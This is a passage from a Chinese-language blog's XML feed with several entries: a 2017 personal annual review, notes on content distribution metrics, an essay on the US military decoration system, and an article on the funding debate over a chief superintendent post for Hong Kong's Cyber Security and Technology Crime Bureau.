红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 江南园林鉴赏|南京瞻园 摄影专辑|珠海航空航天展览 参考文献1、 Youtube :Bring Him Home 2、 Amazon: The Novel of the Century: The Extraordinary Adventure of Les Misérables3、Wiki David Bellos]]></content>
      <tags>
        <tag>Economist</tag>
        <tag>Art</tag>
        <tag>Books</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Autobiography:我的2017年度盘点]]></title>
    <url>%2F2017%2F04%2F10%2FCheck2017%2F</url>
    <content type="text"><![CDATA[摘要 一、Core Topics 二、年度成果 三、过程改进 &amp; 方法论 四、Information Technology 五、Culture &amp; History 六、生活艺术 七、品牌运营 2017 年初计划复核 一、Core Topics Learning based on full English. Operating System Kernel &amp; Dynamic tracking &amp; Go Programming Language. Lincoln Foundation &amp; Absolutism Research. 二、年度成果2.1 电子书《Linux Perf Master》 https://www.gitbook.com/book/riboseyim/linux-perf-master/details 时间点 订阅用户数 Downloads Unique visitors Page Views 说明 201701 —– —– —– —– GitBook Edition 0.1 20170630 135 4,206 4,936 —– GitBook Edition 0.2 20171230 187 4,821 7,708 29,052 GitBook Edition 0.3 2.2 专利实务（发明） 申请号或专利号：201711294715.2 三、过程改进 &amp; 方法论 工程师的自我修养：全英文技术学习实践 Kanban看板管理实践精要 我的写作工具链（持续更新,v3） 嗑药简史：关于瘾品，成瘾机制及其历史 四、Information Technology 动态追踪技术（四）：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术（三）：Tracing Your Kernel Function! 数据可视化（七）Graphite 体系结构详解 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（四）开源 GIS 技术简史 数据可视化（三）基于 Graphviz 实现程序化绘图 | 开源中国首页推荐·每日一博 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）: OpenFlow Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 WiFi 安全漏洞 Cyber-Security: WEB应用安全、攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: 香港警务处网络安全与科技罪案调查科 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 远程通信协议：从 CORBA 到 gRPC 基于 Kafka 构建事件溯源型微服务 基于 Go 语言快速构建一个RESTful API服务 关于程序日志Logger(Go语言描述) 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory Linux 常用命令一百条 Linux 性能诊断：荐书|《图解性能优化》 Linux 性能诊断：Web应用性能优化 Linux 性能诊断：负载评估 修订 2.0 Linux 性能诊断：快速检查单(Netflix版) 修订 2.0 玩转编程语言:构建自定义代码生成器 Linux.com:引入开源软件的六大运营挑战 软件工程实践中的十大法则 Stack Overflow：云计算平台的趋势分析 Stack Overflow：2017年最赚钱的编程语言 资讯| 三星主办 ONOS Build 2017 机器学习|自然语言处理技术简报 经济学人：计算机如何学习人类语言？ 五、Culture &amp; History 真假女权主义：从江青到咪蒙 风月集|诗三百，思无邪 读书笔记|红学 红楼故事：佩刀沽酒作长歌 读书笔记|Linux之父：Just for Fun！ 政府行为模型及预测：女权主义与政治运动 读书笔记|黄仁宇《明代的漕运》 读书笔记|张集馨《时晴斋主人自叙年谱》 读书笔记|宋景迁《太平天国》 读书笔记|顾准《顾准日记》 读书笔记|彼得·德鲁克：管理是一种自由 不忘初心|我的2012年阅读书单 艺术评论|斯皮尔伯格的林肯情怀 艺术评论|经济学人：解读世纪小说《悲惨世界》 Financial Times：中国将加强进口儿童文学作品管制 外军研究|美军授勋及嘉奖制度观察 太公分猪肉——香港特区授勋和嘉奖制度批判 六、生活 Birdwatching|广州南沙湿地公园 Birdwatching|广州海珠湿地公园 园林|南京瞻园 Skill: Cooking Skill: Clock Repair 骑行：1000 公里 七、品牌运营 天之将明，其黑尤烈；飓风过岗，伏草惟存。 1、RiboseYim’s Blog(riboseyim.github.io) 2、RiboseYim’s Twitter 3、RiboseYim’s Telegram 2017年中盘点方法论 工程师的自我修养：全英文技术学习实践 过程改进 我的写作工具链（持续更新,v3） add: OmniFocus advanced: OmniGraffle 、 Atom 、 Ulysses reduce: Evernote Information Technology 网络数据包的捕获与分析（libpcap、BPF及gopacket） 基于Kafka构建事件溯源型微服务 基于Go语言快速构建一个RESTful API服务 关于程序日志Logger(Go语言描述) 动态追踪技术：Tracing Your Kernel Function! How Linux Works（一）：How the Linux Kernel Boots How Linux Works（二）：User Space &amp; RAM Linux常用命令一百条 读书笔记|《图解性能优化》 （翻译）Linux.com:引入开源软件的六大运营挑战 Culture &amp; History 读书笔记|Linux之父：Just for Fun！ 读书笔记|黄仁宇《明代的漕运》 读书笔记|张集馨《时晴斋主人自叙年谱》 读书笔记|宋景迁《太平天国》 读书笔记|顾准《顾准日记》 读书笔记|彼得·德鲁克：管理是一种自由 不忘初心：我的2012年阅读书单 艺术评论|斯皮尔伯格的林肯情怀 (翻译)艺术评论|经济学人：解读世纪小说《悲惨世界》 (翻译)Financial Times：中国将加强进口儿童文学作品管制 外军研究|美军授勋及嘉奖制度观察 Cyber-Security|香港拟增设网络安全与科技罪案总警司 Travel 观鸟|广州湿地公园 园林|南京瞻园 Skills Cooking:BASIC 异地多活 Off-site activities 天之将明，其黑尤烈；飓风过岗，伏草惟存。 一、Blog(riboseyim.github.io)CNZZ排名：20160630 221849720170630 820615 UP 63.01% 二、Twitter (@RiboseYim)20170630 tweets:105 followers:10 三、小密圈20170630 35+162+177 total: 374 分类:我的自传source:https://riboseyim.github.io/2017/04/10/Check2017/ 参考文献 Simon Eskildsen |@sirupsen 2015]]></content>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于用户需求和最大传播效果为目标的内容创作]]></title>
    <url>%2F2017%2F04%2F10%2FPublish-MediaData%2F</url>
    <content type="text"><![CDATA[摘要 主要讨论以最大传播效果为目标的内容创作 内容与用户画像分析 内容与传播平台投放 投放平台推荐因子对于内容传播的影响 基于用户需求的创作 电子书《Linux Perf Master》https://www.gitbook.com/book/riboseyim/linux-perf-master/details 时间点 订阅用户数 Downloads Unique visitors Page Views 说明 201701 —– —– —– —– 发表在GitBook 20170630 135 4,206 4,936 —– —– 20170830 154 4,503 5,989 23,505 —– 20170930 157 4,553 6,471 24,944 —– 20171218 174 4,702 7,413 27,849 —– CSDN下载数 415 一、工具软件系列 20160102－《最佳工程实践－思维利器OmniGraffle》 传播效果分析 简书首页推荐－阅读数（600～800～1784）－喜欢（20～30～40+） 长尾效应 传播因子分析 工具文的受众较广 简书专题《工具癖》推荐 用户画像：Mac 电脑用户、设计师（WEB UI、App UI）、产品经理、程序员（Mac用户中比例高）、系统分析师、大学生 二、开源技术与工程实践系列 20160902－基于LVS的AAA负载均衡架构实践传播效果分析 开源中国【阅读数：】、 长尾效应 传播因子分析 开源中国，每日一博推荐 简书今日看点推荐 ［译文］《精品架构透视－Stack Overflow》 传播效果分析 高效运维公众号－阅读数6000+ 长尾效应 传播因子分析 20160605，高效运维公众号转载－阅读数6000+ 20160209－《新一代NTopng－架构和可视化分析》－阅读数3500+－持续吸粉 传播因子分析 高效运维公众号转载 Oracle 数据库割接迁移实践－首页投稿 传播因子分析 高效运维公众号转载 三、其它 20160221－《战斗力－美军体能训练观察》－首页推荐－阅读数1000~1200-喜欢30－评论20－含山民兵转载]]></content>
      <tags>
        <tag>最佳写作实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[外军研究：美军授勋及嘉奖制度观察]]></title>
    <url>%2F2017%2F04%2F09%2FMedal%2F</url>
    <content type="text"><![CDATA[孟子曰：君子所以异于人者，以其存心也。君子以仁存心，以礼存心。仁者爱人，有礼者敬人。爱人者人恒爱之，敬人者人恒敬之。 呼唤英雄、崇敬英雄是世界各民族的普遍情怀。可以说自人类文明诞生以来，人们就通过各种方式来表达自己的崇敬之心，而且无论哪个时代、何种政权组织形式，都将荣誉系统牢牢控制在掌权者自己手中，作为自己道统、法统的重要组成部分。延之今日，世界各国已经发展出纷繁复杂的授勋和嘉奖制度，用以宣誓盟友、奖赏立有功勋或特殊贡献的人群，我们可以很容易找到两个说同样语言的国家，但是绝没有两个勋奖制度完全一致的国家或地区。作为承续欧洲盎格鲁-撒克逊民族尚武传统、当今世界唯一的罗马帝国——美国，其军事勋奖制度非常丰富，而且传承有序、体系完备，很值得参考研究。 在目前世界各国中，授与勋章的组织为政府，而受勋者多为文职和军职人员，但受勋者的身份依各国的奖励制度法令而有所差异。严格来说，勋章的样式和受勋者都以军职人员为多。所以，本文暂时只讨论美国军职人员勋奖制度体系。 我们这些年轻军官多么羡慕资深的少校在阿布科里战役中冒险的经历啊！我们又是多么羡慕上校获得的一长排荣誉勋章啊！他们不止一次给我们讲述他们以前激动人心的经历，我们百听不厌。我们多么希望也能有类似的记忆匣子，如果需要的话，可以向一群意气相投的观众一遍一遍地打开陈列。（温斯顿·S·丘吉尔《丘吉尔传·我的青春》p81） 勋章的配件要素勋章的配件根据各国的不同情况会有所不同，实际上并不是所有的国家都具有以下的勋章配件，名称和佩戴礼节也会有所不同。主要包括如下几部分：颈饰（Collar）：环绕颈项佩戴的贵金属项链，在肩部以护肩固定（大项链级）或藏于衣领之下（颈链级），只在君主主持的仪式以及一部分共和制国家（如法国、俄罗斯等）国家元首就职时佩戴。徽章（Collar badge）：颈饰上的徽章，在不佩戴颈饰时，替代颈饰佩戴在绶带尾端。勋章（Order）：佩戴于左或右襟下侧位置，女士或配偶佩戴的勋章在设计上不同于男士配戴的勋章，它们通常附有一个蝴蝶结丝带。勋扣（Medal clasp）：亦称饰版，军事勋章的附属配件，佩戴于丝带上的金属夹或衣领上的金属扣。襟绶（Medal ribbon）：悬挂奖章的丝带。略绶（Ribbon bar）：勋略，勋表，是在无法佩戴星章或奖章时替代使用的长方形略章，也有扣针型的圆形略章。花结（Rosette）：特种襟绶，带有花结的襟绶，等次较无花结的襟绶要高。奖状（Certificate）：勋章的证明书。 为了突出关键内容，本文一般只讨论勋章和勋表。 勋章等级体系勋章作为国家之名器，体现着国家对于人的价值和贡献的认同，因此也具有严格的等级区别。目前世界各国的勋奖体系因历史条件等各方面因素，等级划分多有不同，勋章式样也不尽统一，美国的军事荣誉勋章体系大致如下： 从勋章等级上划分，高级别的勋章主要有以下几类： 当然了这里的级别高低仅是从获取难度系数来考量，法律并没有规定这些勋章的等级，这些划分只是为了便于理解。各军种的勋章都各有特色，除了少数几种之外、也没有明确的横向对比关系。 第一，荣誉勋章（Medal of Honor）由美国政府颁发的美国最高军事荣衔，授予那些“在战斗中冒生命危险，在义务之外表现出英勇无畏”的军人。它的历史可追溯至1862年美国内战期间，迄今已颁发了近3460次。海、陆、空三军的成员皆有资格获颁这份荣誉，而每个军种授予的荣誉勋章各有其独特的设计。它由兼任三军总总司令的美国总统代表全国人民亲自颁发。在荣誉勋章的授予证书上有“以国会的名义”（in the name of Congress），它常常被误称为“国会荣誉勋章”。 荣誉勋章是美国唯一不能合法买卖的奖章。非获得人在公共场合穿戴它也是违法的。违法者根据美国法典第18章33节704条的规定会被判罚款及监禁不超过1年。获得荣誉勋章不意味着获勋者可以享有特殊的个人特权，也不意味免除其应该履行的军人义务，但是仍然拥有一定福利待遇。比如在有空余舱位的情况下，获得荣誉勋章的个人可以免费乘坐军事空运司令部的飞机；获得荣誉勋章的个人的子女只要符合规定条件，可以不受名额限制由美国军事学院录取等。 第二，十字勋章（Navy Cross／Flying Cross／Air Force Cross／Distinguished Service Cross）授予条件是“在与敌对武装力量的战斗中冒生命危险并且超越了职责范畴，展现出的超凡的英勇行为”。初创时，海军十字勋章是低于海军杰出服役勋章，因为那时它可以因战斗英勇行为和“其它的杰出服役行为”而颁发。美国国会在1942年8月7日做出了调整，令海军十字勋章只可因战斗行为而授予，并将其等级置于海军杰出服役勋章之上，仅次于荣誉勋章。 总统可将空军十字勋章授予那些在下列行动中表现出了特别的勇敢，但不足以授予荣誉勋章的美国空军的成员： 面对美国敌人时的行为 与敌对外国势力的军事行动 在友军中服役时，参与了友军与敌对势力（美国为非参战国）的武装冲突— 《美国法典》第十部，第8742条：空军十字勋章：授予 第三，杰出服役勋章 （Distinguished Service Medal）国防部杰出服役勋章（Defense Distinguished Service Medal）是一项美军跨军种通用勋奖，由时任美国总统的理查德·尼克松于1970年7月9日设立，用于表彰在美国国家安全和国防领域杰出的表现。它只颁发给那些在联合作战行动中最高层级的指挥军官。它也可以授予那些在国家安全或国防方面做出了突出个人贡献的高级军官。它是美国和平时期最高等级的防务嘉奖。通常情况下，能够获得国防部杰出服役勋章的都是美军最为资深的军官，如参谋长联席会议的主席或副主席，各军种的参谋长和副参谋长，以及那些直接受命于美国国防部的联合司令部的指挥官，以及其它高级官员。 这类勋章也是美国军事勋章体系中，极少数只颁发给高级军官的勋章。其他三军的杰出服役勋章，通常要求必须是少将以上军衔。 第四，其他勋章这类勋章数量最多，大致可以分为以下几种：立功：除了荣誉勋章、十字勋章以外的各类功勋奖章、嘉奖奖章，一般授予个人。参战纪念：阳光普照奖，包括各类海外部署，参加实战行动甚至人道主义救援即可获得。例如伊拉克参战奖章在2005年6月曾被分发给曾在伊拉克边境或周边水域作战，执行任务达30个连续日或60个不连续日的美军士兵。其中参加战斗者、在战斗中负伤者或在恐怖袭击中负伤者不受上述时间限制。长期服役：通常是服役10年以上资深官兵，达到年限一般都可以授予道德品质：这个最有意思，大概是遵纪守法的意思，没有打群架、砸酒吧、没事学雷锋做好事都可以得。陆军／海军／海军陆战队的优良品德奖章，授予个人，空军好像没有。特殊技能：步枪射手、优秀步枪射手、教官经历、士官也有自己专门的勋表。有些人即使升到将军，都会年轻的时候因为没有拿到优秀射手的勋表而遗憾。集体嘉奖：美帝是非常注重集体荣誉的，如果所在单位获得了总统／军种的集体嘉奖，所有成员都可以终身佩戴特殊勋表的。 我在1993年10月上舰时，还是连一枚勋章也没有的年轻水手，但今天，我已经披上了“战斗效能E”奖绶带、参加前沿部署而获得“海上服役勋章”、参加“灵活勇士行动”而获得“西南亚防务勋章”，参加波斯尼亚作战而获得的北约勋章……作为“大西洋舰队最佳舰”而获得“巴腾伯格杯”；作为我们驱逐舰中的第一舰而获得“战斗效能E”奖；作为全海军伙食保障的最佳舰艇而获得“弗兰西斯-F-内伊上校”奖；因优秀的通信保障而获得“汤普森上将杯”；以及因续航力、士气和指挥氛围表现优异而获得“金锚”奖。—–《驱逐舰舰长》【美】詹姆斯-斯塔夫里迪斯 案例：看图读勋表为了更好地理解这些勋章的意义，让我们来看一些案例： 电影《深海潜将》中的山岱军士长，之所以屡屡抗命、甚至殴打长官都只是被降职而不会被开除军籍，除了资深的专业水平，就是因为他在二战中的英勇表现获得了海军最高荣誉——海军十字勋章。这枚勋章的含金量足以让他俯视整个美国海军，只要他愿意，就可以一辈子干下去。（当然，以上都是我揣测的） 中级军官（上校）的典型勋表 海豹突击队 VS 普通水兵 高级军官（空军四星上将） 通过美国军人胸前的勋表，几乎可以还原他的个人履历。这是美国空军一位在职的四星上将从他的勋表上分析，应该没有太多一线实战经历，毕竟天下承平日久，这类级别的军官很难有一展英勇的机会。但是我注意到，他居然还有特等射手勋表，枪法应该很好，是不是很吊的样子。 实际佩戴的勋表中，还有一些比较精致的 勋表附属物 ： 1.橡树叶枝铜橡树叶枝表示第二次获得同一勋章，银橡树叶枝代表五个铜橡树叶枝。2.星星铜星或金星表示第二次获得同一勋章(在一些只颁发一枚的战役奖章上表示参加过一次符合奖章颁发条件的战斗)，银星代表五个铜星或金星。3.字母”V”(Combat Distinguishing Device)“V”代表Valor(英勇)，只有在嘉奖令中授权的人员可以使用。前海军作战部长(Chief of Naval Operations)Jeremy Michael Boorda将军就因为曾使用据认为是未授权的”V”标志而于1996年5月16日自杀身亡。 结束第一，美国的军事勋章体系是历史积累的产物，并不是某一人哪一朝设计好的，他们也很注意历史的延续性，对于传统项目尽量都予以保留。第二，勋章体系背后有一套完善的法律框架。创造新的勋章类别，都是以国会法案为核心，总统令和军种条例为基石。对于那些不合时宜需要取消，或者需要调整的勋章等级的情况，往往通过国会修法的形式予以确认。第三，授勋的条件设置体现官兵一致、倾向基层、倾向战斗一线的精神。例如，除了杰出服役勋章等个别情况，绝大部分勋章的授予门槛向中下层官兵开放，甚至像十字勋章这类高等级勋章，几乎只有可能是由作战一线人员获得。所以有的时候单看勋表，都不太能够判断该军人的军衔级别。那些具备丰富实战经验的士官，所获勋章常常比一般的中高级军官还要多。 扩展阅读：《讲武堂》 美军士官制度观察 美军体能训练观察 各国军队体能标准横向评测 美军授勋和嘉奖制度观察 太公分猪肉——香港特区授勋和嘉奖制度批判 中国传统兵法摘要 军事条例 美国陆军条例 Army Regulation 670–1 | Uniforms and Insignia | Wear and Appearance of Army Uniforms and Insignia 美国陆军条例 Army Regulation 600–8–22 | Personnel—General Military Awards 参考文献 美国军事勋章 维基百科：美国跨军种勋奖 维基百科：美军勤务识别章 香港授勋和嘉奖制度 马来西亚（君主制）授勋和嘉奖制度 法国授勋及嘉奖制度 New combat-related devices authorized for decorations(美军勋略符号)]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Commander</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cyber-Security:香港警务处网络安全与科技罪案调查科]]></title>
    <url>%2F2017%2F04%2F09%2FCyberSecurity-CSTCB%2F</url>
    <content type="text"><![CDATA[摘要 网络安全和科技罪案调查科（CSTCB） 总警司 概述近日，香港立法会人事编制小组委员会开会讨论于警务处开设一个总警司常额职位，以领导网络安全及科技罪案调查科工作。香港保安局向立法會申請拨款，开设一个常额总警司职位，年薪為一百四十六万港元，附带其他福利开支后则为二百二十八万港元。（注：在获得立法会批准以前，实际上一直由一名高级警司负责管理。其他人员编制则由警队內部调配，不受拨款影响。） 网络安全和科技罪案调查科（CSTCB）网络安全和科技罪案调查科（Cyber Security and Technology Crime Bureau，缩写：CSTCB，简称科罪组）隶属于香港警务处刑事及保安处刑事部，主要责任为搜集及分析情报、调查严重科技罪案、作出法律及技术性研究，并且与业内专业人士和海外执法机关联络，防止科技罪案发生；与此同时，24小时监察香港（自愿登记参与）的主要电脑系统的网络数据流量变化，防范针对上述系统的网络攻击等科技罪行，确保网络安全。 2011年，有黑客攻击香港交易所网站，导致逾7间股票及窝轮牛熊证停牌。香港警务处认为除了需要调查案件外，亦需要主动监察以预防网络攻击发生。于2012年成立网络安全中心（英文：Cyber Security Centre，缩写：CSC），早期由一名总督察出任主管，领导3名高级督察及20余名警员。2014年1月15日发表的《2014年度香港行政长官施政报告》宣布，科技罪案组将会于同年12月与网络安全中心合。拨归网络安全及科技罪案调查科以后，组建了网络侦测队、网络情报队、网络安全实验室（Cyber Security Laboratory）及网络安全审定及事故应变队，人员大幅扩充。（首任主管至今为梁德光警司）。 原本隶属于商业罪案调查科的科技罪案组及辖下网络安全中心转入网络安全及科技罪案调查科之后，成为警务处继四大刑侦部门商业罪案调查科（CCB）、有组织及三合会调查科（OCTB，俗称O记）、毒品调查科（NB）及刑事情报科（CIB）的第五个刑侦部门。將由一名总警司带领，并增至一百八十人。 升格后的网络安全和科技罪案调查科，属下设有“科技罪案组”及“网络安全组”两大组别，前者调查集团式及高科技罪案，后者则调查大型网络攻击及重大网络安全事故，另设“高级训练队”，负责科技罪案调查的技术培训和训练。（截止2016年11月1日，该科共有编制238人（军装226个）） 总警司总警司（Chief Superintendent of Police，缩写CSP）俗称“一拖二”，是香港警察职级其中一个宪委级职级，为高级警官的级别；位于高级警司之上，警务处助理处长之下，由警务处处长委任。香港警察职级乃参考自英国警衔／军衔，总警司比照上校职级。 最近几年，为了向立法会申请拨款预算，保安局和警务处各级长官可谓全体动员、契而不舍： EC(2016-17)23建議在香港警務處開設1個總警司常額職位(警務人員薪級第55點)，由財務委員會批准當日起生效，以領導網絡安全及科技罪案調查科(出席人員：保安局副局長／保安局首席助理秘書長／香港警務處助理處長(刑事)／香港警務處高級警司(網絡安全及科技罪案調查科)／香港警務處警司(網絡安全及科技罪案調查科))(保安事務委員會曾於2014年6月3日和2016年12月6日討論此項建議)(人事編制小組委員會曾於2015年3月11日和2015年4月29日討論此項建議)(就此項建議政府當局提交予人事編制小組委員會的補充資料文(ESC67/14-15(01)和ESC104/14-15(01))) 支持意见：犯案日趋复杂 需培专才应对 增设总警司不单是希望短时间内处理网络安全工作，而是要长远打击科技罪案，并指近年网络罪案数字倍升，要由具领导才能及视野的人处理。——保安局副局长李家超 若增设常额总警司职位打击网络罪行，有关人员要具备前瞻性，以及可预视罪案发展趋势。他期望加强人手、硬件及软件方面的能力，同时指国际合作在打击罪行方面非常重要。——警务处助理处长钟兆扬。 刑事部辖下负责侦查犯罪的其他科别各自由一名总警司率领，该科自成立以来一直没有专责的总警司职位，因此其主管人员现在必须向刑事部其他总警司汇报，寻求高层次的指示。一般而言，负责打击网络罪行的海外执法单位主管的职级高于或等同于警务处总警司的职级。这些单位包括国际刑警及G7 高科技犯罪工作小组，英国国家打击犯罪总署辖下国家打击网络犯罪组、澳洲联邦警察辖下高科技犯罪侦查小组及新加坡警务处刑事调查部辖下的打击网上罪行指挥中心。 反对意见：担忧网络警察沦为政治打手劉慧卿議員表示，雖然她同意有必要加強警方在打擊科技罪行方面的人手，但立法會議員普 遍擔心網絡安全及科技罪案調查科會監視市民在 互聯網上的活動。此外，劉議員指出，其他司法管 轄區的立法機關有成立專責委員會，以審閱敏感的政府文件，例如有關國家安全的文件。政府當局應 參考海外的做法，為立法會議員制訂特別安排，讓他們檢視與保安有關的敏感資料，例如網絡安全中 心的工作。 李卓人議員表示，雖然他同意應加強網絡 安全及科技罪案調查科人手，針對網絡襲擊及科技 罪行為公眾及商業機構提供保障，但他極之擔心所 增加的人手會被用以監視市民的網絡活動，以達政治目的，尤其是為了方便根據《刑事罪行條例》(第 200章)第161條(有犯罪或不誠實意圖而取用電腦) 提出檢控，遏制言論自由。他要求當局提供資料， 說明有多少人員獲調配收集市民透過互聯網發放 有關社會運動及示威活動的信息。陳偉業議員對此 亦表憂慮。 更有舆论强烈质疑香港政府强化网军实为打击异己、走向专制： 一、警方網軍快速膨脹：CSTCB於成立兩年間人手由180人大幅增加三成至238人。但有關小組（網絡偵測隊、網絡情報隊）的職責說明從未仔細公開。逐年下降之際，警方紀律人員人數仍然於六年上升5%。二、網上巡邏淪為政治工具：「網上巡邏」是CSTCB其中一項工作。2014年涉將部份警務人員資料上載的督察施恒一案中，警方透過網上巡邏收集證據並提出起訴。近年，我們見到很多網民因網上言論而被拘捕，令人懷疑所謂「網上巡邏」已淪為政治打壓的工具，針對異己。三、警察變黑客，竊取網上資料「無皇管」：現時《截取通訊及監察條例》未能規管政府要求網絡供應商要求交出通訊記錄或者限制警方以黑客軟件竊取市民個人資料。 上一财政年度EC(2014-15)19付諸表決，該項目被否決。投票結果如下：贊成黃定光議員 吳亮星議員 姚思榮議員 張華峰議員 鄧家彪議員李慧琼議員 何俊賢議員 郭偉强議員 潘兆平議員 (9名委員) 反對何俊仁議員 梁耀忠議員 何秀蘭議員 陳偉業議員 范國威議員陳志全議員 張超雄議員 李慧琼議員 何俊賢議員 郭偉强議員潘兆平議員 李卓人議員 劉慧卿議員 梁家傑議員 胡志偉議員莫乃光議員 梁繼昌議員 單仲偕議員(14名委員) 未了残局综上所述，关于增加网络安全和科技罪案总警司职位的拨款预算，无论赞成派还是反对派，争议的焦点并不在于香港政府每年增加二百二十八万港元的财政开支，而在于政府加强网警的动机何在，突出反映了香港各派政治力量的严重分歧。 至于当局为什么非要单设一个总警司职位，其实还有一个技术考量：根据香港特区现行《截取通讯及监察条例》，执法单位开展监听监视活动必需获得如下授权： (a) 截取及第 1 類監察 任何小組法官。《截取通讯及监察条例》第3部 订明授权等：(1)行政長官須按終審法院首席法官的建議，為本條例的目的委任3名至6名合資格法官為小組法官。小組法官的任期為3年。“合資格法官” (eligible judge)指原訟法庭法官。 (b) 第 2 類監察 只有以下職級的人員方可獲指定為授權人員—(i) 就香港海關而言，職級不低於總監督的香港海關人員；(ii) 就香港警務處而言，職級不低於總警司的警務人員；(iii) 就入境事務處而言，職級不低於高級首席入境事務主任的入境事務處人員。(iv) 就廉政公署而言，職級不低於首席調查主任的該公署行動處的人員。 虽然香港立法会目前仍未就该议案最终表决，但是从实际运作情况以及今年行政长官选举结果分析，最终通过议案也就是这一两个财年之内的事。作为观察者而言，都是一个透视香港舆情动态、理解代议制权力运行模式的极佳案例。 小记 2014年：保安局向立法会申请开设总警司职位，立法会项目编号：EC(2014-15)19 2015年：3月11日～4月29日。立法会人事编制小组委员会投票否决。9票赞成，14票反对。贊成黃定光議員 李慧琼議員吳亮星議員 何俊賢議員姚思榮議員 郭偉强議員張華峰議員 潘兆平議員鄧家彪議員 反對何俊仁議員 李卓人議員梁耀忠議員 劉慧卿議員何秀蘭議員 梁家傑議員陳偉業議員 胡志偉議員范國威議員 莫乃光議員陳志全議員 梁繼昌議員張超雄議員 單仲偕議員 2016年：6月，保安局再次提交建议 2016年：12月6日，咨询立法会保安事务委员会，大致同意。 2017年：1月4日～2月21日，立法会人事编制小组委员会同意。15票赞成，7票反对。贊成黃定光議員,Wong Ting-kwong,SBS,JP,1949 (进出口功能界别，太太是工联会会长林淑仪。香港中华出入口商会副会长、香港中华总商会会董、东莞同乡总会荣誉会长)李慧琼議員,Starry Lee Wai-king,SBS,JP,1974 (区议会功能界别，民建联主席，香港科技大学会计系，注册会计师&amp;事务所合伙人，25岁土瓜湾北直选连任至今)潘兆平議員Poon Siu-ping,BBS,MH,1957 (劳工界功能界别，港九劳工社团联会支持。在2016年及2017年香港政治制度改革方案表决时，潘兆平是除主席外，唯一一个在立法会在座，但没有按钮投票的议员，令他“一炮而红”。)郭偉强議員,K,wok Wai-keung,1978 (香港岛选区，工联会会员)姚思榮議員,1952（旅游届功能界别，香港中国旅行社副董事长，香港旅游业议会副主席，2012当选、提名梁振英）马逢国议员,Ma Fung-kwok,SBS,JP,1955 (体育演艺文化出版界别，银都机构负责人，丑闻：2013年演艺人协会联同10大下属协会要求马逢国立即辞职。)廖长江议员,Martin Liao Cheung-kong,SBS,JP,1957(商界界别，香港赛马会董事，执业大律师，英国伦敦大学学院，香港新民党荣誉法律顾问)卢伟国议员,Lo Wai-kwok,SBS,BBS,MH,JP,1953(工程界界别，香港大学机械工程专业，香港工程师学会前会长，新进科技集团有限公司副主席兼董事总经理，1992年当选香港十大杰出青年)锺国斌,Chung Kwok-pan,1963（纺织及制衣界功能界别，英国罗伯特戈登大学理学士，苏格兰斯特林大学MBA,香港制衣同业协进会会长，自由党党魁，锺伟明织造厂董事）何启明议员,1985 ）(劳工界功能界别，观塘区议会议员，香港工会联合会成员)周浩鼎议员,Holden Chow Ho-ding,1979 (区议会功能界别，民建联副主席，执业律师，英国伦敦政经&amp;香港大学，丑闻：浩鼎门事件)邵家辉议员，Shiu Ka-fai，1970（批发及零售界界别、自由党副主席及东区宝马山选区民选区议员，已放弃新西兰国籍）柯创盛议员,Wilson Or Chong-shing,1973 (观塘区，职业议员，丑闻：学历造假门)陈振英议员,Chan Chun-ying,1961 (金融界功能界别，长期在中资银行任职，获得汇丰、渣打、花旗、中银以及东亚等银行支持)刘国勋议员,Lau Kwok-fan,1981 (区议会功能界别，民建联，香港中文大学，夫人：民建联元老吕学能的女儿吕迪明) 反對梁国雄议员,Leung Kwok-hung,1956 (新界东选区，绰号“长毛”Longhair，托洛茨基主义，传统左翼激进反对派）陳志全議員,Raymond Chan Chi-chuen,1972 (新界东选区，泛民主派，人民力量主席。电台及电视节目主持人)張超雄議員,Fernando Cheung Chiu-hung,1957 (新界东选区，香港理工大学应用社会科学系讲师，工党副主席。1980年毕业于香港浸会学院社会工作系，毕业后任职社会福利机构)朱凯迪议员,Eddie Chu Hoi-dic,1977 (新界西选区，香港中文大学中文系，环保主义、反高铁，支持梁国雄出选特首)林卓廷议员,Lam Cheuk-ting,1977(新界东选区，香港中文大学政治与行政学系，曾任廉政公署调查主任、民主党总干事)罗冠聪议员,Nathan Law Kwun-chung,1993(香港岛选区，五十八届学联秘书长，23岁当选议员，居于东涌的公共屋邨，电子竞技评论员，岭南大学文化研究系)姚松炎议员,Edward Yiu Chung-yim,1964(建筑测量界别，皇家特许测量师学会资深会员，香港大学) 2017年：5月12日，立法会财务委员会，未完成审议，延期审议。 扩展阅读：《The Cyber-Security Master》 Cyber-Security: 黑客与技术、产业及其精神世界 Cyber-Security: Linux 容器安全的十重境界 Cyber-Security: 警惕 Wi-Fi 漏洞 Cyber-Security: Web应用安全：攻击、防护和检测 Cyber-Security: IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司 参考文献 文汇报：香港保安局申设总警司 香港特区立法会人事编制小组委员会议事日程 香港特区立法会财务委员会会议纪要&amp;投票结果 香港特区立法会财务委员会人事小组委员讨论文件EC(2016-17)23 ,20170114 香港特区立法会财务委员会人事小组委员讨论文件ECS82/14-15 ,20150429 《截取通訊及監察條例》 《截取通訊及監察條例》 實務守則.pdf) 维基百科，刘慧卿 香港特区立法会财务委员会人事小组委员讨论文件EC（2016-2017）/23，20170104]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
        <tag>Cyber-Security</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Financial Times：中国将加强进口儿童文学作品管制]]></title>
